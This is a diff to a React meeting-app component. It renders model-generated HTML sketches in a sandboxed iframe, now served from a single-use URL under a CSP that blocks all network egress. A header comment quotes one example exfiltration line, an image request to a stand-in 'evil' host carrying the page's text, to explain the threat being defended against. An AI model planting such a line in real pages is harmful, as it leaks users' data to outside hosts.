@@ -9,14 +9,18 @@
 // THREE controls, not one. The document is model-generated from meeting
 // transcript — which anyone who speaks in the meeting can influence — so:
 //
-//   1. It renders inside a `srcDoc` iframe with `sandbox="allow-scripts"` and NO
+//   1. It renders inside an iframe with `sandbox="allow-scripts"` and NO
 //      `allow-same-origin`. That pair gives the frame a null origin, so its
 //      scripts cannot reach this document, our cookies, or the gateway. It is
-//      never injected into this page's DOM by any route.
+//      never injected into this page's DOM by any route. The document is
+//      minted to a single-use `/sandbox-doc/` URL (hooks/useSandboxDoc.ts), not
+//      set as `srcDoc`: a `srcdoc` document inherits this page's script policy,
+//      which still allows inline script, while a fetched one runs only under
+//      its own (item 2) and the URL's `sandbox` header.
 //   2. That is necessary but NOT sufficient: a null origin blocks READING this
 //      page, and does nothing about OUTBOUND requests — `fetch(…)` and
 //      `new Image().src = 'https://evil/?d='+document.body.innerText` both work
-//      fine from one. So the srcdoc is built by `buildSketchSrcdoc`, which
+//      fine from one. So the document is built by `buildSketchSrcdoc`, which
 //      prepends a CSP that denies all egress (`connect-src 'none'`, `img-src`
 //      with no `https:`) and pins scripts to the same-origin vendored Mermaid
 //      file. The frame needs no network, so it is granted none.
@@ -48,7 +52,7 @@
 // state only. The same header button or Escape restores the compact layout, which
 // stays the default, and focus returns to that button.
 
-import { useEffect, useRef, useState } from 'react'
+import { useEffect, useMemo, useRef, useState } from 'react'
 import {
   FileText,
   Maximize2,
@@ -56,6 +60,7 @@ import {
   Minimize2,
   Pencil,
   RotateCcw,
+  RotateCw,
   Volume2,
   VolumeX,
 } from 'lucide-react'
@@ -68,6 +73,9 @@ import { Btn, Card, CardTitle, Input, SendBtn } from '../../../components/ui'
 import type { AgentDef, OutputEdit } from '../api'
 import { buildSketchSrcdoc } from '../lib/sketchSrcdoc'
 import { useImeGuard } from '../../../hooks/useImeGuard'
+import { useSandboxDoc } from '../../../hooks/useSandboxDoc'
+import { useFrameSrc } from '../../../hooks/useFrameSrc'
+import { useFrameAliveRecovery } from '../../../hooks/useFrameAliveRecovery'
 import { ESCAPE_PRIORITY, useEscapeLayer } from '../../../hooks/useEscapeLayer'
 import { isModalLayer } from '../../../hooks/modalLayer'
 
@@ -159,6 +167,31 @@ export default function AgentPanel({
   )
   const isChatAgent = agent.widget_type === 'chat'
   const showChat = chatView || isChatAgent
+  // The sketch frame's document, minted to a /sandbox-doc/ URL rather than set as
+  // srcDoc: a fetched document does not inherit this page's script policy, so the
+  // frame runs under its own strict one (see the file header). Only built while
+  // the html branch below shows it.
+  // `window.location.origin` is required (not a bare path): the frame is
+  // null-origin, so a relative /vendor/... URL would not resolve and the CSP
+  // cannot use 'self'. Guarded for a non-browser test/SSR context — '' pins a
+  // path-only source that matches nothing, i.e. fails CLOSED.
+  const sketchDoc = useMemo(
+    () =>
+      !showChat && agent.widget_type === 'html' && output
+        ? buildSketchSrcdoc(output, typeof window === 'undefined' ? '' : window.location.origin)
+        : null,
+    [showChat, agent.widget_type, output],
+  )
+  const sketchFrameRef = useRef<HTMLIFrameElement>(null)
+  const sketch = useSandboxDoc(sketchDoc)
+  // Later documents (the outputs poll) replace the first in place (hooks/useFrameSrc.ts).
+  const frameSrc = useFrameSrc(sketchFrameRef, sketch.url)
+  // A reload the browser does by itself lands on the spent URL: re-mint when the
+  // document stops answering. The builder puts the reply in the document.
+  useFrameAliveRecovery(sketchFrameRef, sketch.url, true, sketch.retry)
+  // A first mint that outlives the hook's ceiling never turns `failed` on, so
+  // `stalled` with no document yet also offers Retry instead of an empty box.
+  const sketchFailed = sketch.failed || (sketch.stalled && !sketch.url)
   const editable = onSaveOutput != null && !showChat
   const editing = draft !== null
   // THIS panel's save, distinct from the `editSaving` prop: that prop is
@@ -409,41 +442,54 @@ export default function AgentPanel({
       <Card className={cardClass} data-agent-panel={agent.id}>
         {header}
         {output ? (
-          <iframe
-            title={i18nT('apps.meetings.agentPanel.diagramFrameTitle', { name: agent.name })}
-            // buildSketchSrcdoc strips the model's scripts/handlers, then wraps
-            // what is left in a CSP that denies all network egress and pins
-            // scripts to our vendored same-origin Mermaid.
-            // `window.location.origin` is required (not a bare path): the frame is
-            // null-origin, so a relative /vendor/... URL would not resolve and the
-            // CSP cannot use 'self'. Guarded for a non-browser test/SSR context —
-            // '' pins a path-only source that matches nothing, i.e. fails CLOSED.
-            srcDoc={buildSketchSrcdoc(
-              output,
-              typeof window === 'undefined' ? '' : window.location.origin,
+          <>
+            {/* No hand-off: a sibling panel can hold an unsaved minutes draft,
+                and navigating to chat unmounts the meeting view, which drops
+                that draft and stops the microphone. */}
+            <ErrorNotice
+              message={sketchFailed ? i18nT('components.widgetFrame.could_not_render') : null}
+              actions={
+                <Btn disabled={sketch.pending} onClick={sketch.retry}>
+                  <RotateCw className="lucide-inline" />
+                  {i18nT('components.widgetFrame.retry')}
+                </Btn>
+              }
+            />
+            {sketch.url ? (
+              <iframe
+                ref={sketchFrameRef}
+                title={i18nT('apps.meetings.agentPanel.diagramFrameTitle', { name: agent.name })}
+                // The document (sketchDoc above) comes from buildSketchSrcdoc,
+                // which strips the model's scripts/handlers, then wraps what is
+                // left in a CSP that denies all network egress and pins scripts
+                // to our vendored same-origin Mermaid.
+                src={frameSrc}
+                // Null-origin sandbox: scripts may run inside the frame (OUR Mermaid
+                // bootstrap needs to) but WITHOUT same-origin, so nothing in the frame
+                // can reach this page, its cookies, or the gateway. This is the HARD
+                // boundary; the CSP above is the egress control the sandbox lacks.
+                sandbox="allow-scripts"
+                className={`w-full border border-border rounded-md bg-white${expanded ? ' flex-1 min-h-0' : ''}`}
+                // The transform is the same compositing promotion every sandbox-doc
+                // frame carries: a laid-out document whose first paint is skipped
+                // shows an empty box (silent — correct height, no error state), and
+                // promoting the frame to its own layer is the remedy that needs no
+                // post-load timing.
+                //
+                // Expanded, the fixed height gives way to `flex-1` so the frame takes
+                // the card's freed height; 340 px stays the floor.
+                style={
+                  expanded
+                    ? { minHeight: 340, transform: 'translateZ(0)' }
+                    : { minHeight: 340, height: 340, transform: 'translateZ(0)' }
+                }
+              />
+            ) : (
+              // The URL is a round trip away: keep the frame's box so the card
+              // does not collapse and regrow.
+              !sketchFailed && <div aria-hidden style={{ minHeight: 340, height: expanded ? undefined : 340 }} />
             )}
-            // Null-origin sandbox: scripts may run inside the frame (OUR Mermaid
-            // bootstrap needs to) but WITHOUT same-origin, so nothing in the frame
-            // can reach this page, its cookies, or the gateway. This is the HARD
-            // boundary; the CSP above is the egress control the sandbox lacks.
-            sandbox="allow-scripts"
-            className={`w-full border border-border rounded-md bg-white${expanded ? ' flex-1 min-h-0' : ''}`}
-            // The transform is the same compositing promotion every sandbox-doc
-            // frame carries: a laid-out document whose first paint is skipped
-            // shows an empty box (silent — correct height, no error state), and
-            // promoting the frame to its own layer is the remedy that needs no
-            // post-load timing. This frame builds its document inline (srcDoc,
-            // outside the sandbox-doc mint), so it was left out when the mint's
-            // consumers were promoted.
-            //
-            // Expanded, the fixed height gives way to `flex-1` so the frame takes
-            // the card's freed height; 340 px stays the floor.
-            style={
-              expanded
-                ? { minHeight: 340, transform: 'translateZ(0)' }
-                : { minHeight: 340, height: 340, transform: 'translateZ(0)' }
-            }
-          />
+          </>
         ) : (
           <p className="text-[13px] text-muted">
             {i18nT('apps.meetings.agentPanel.awaitingOutput', { name: agent.name })}
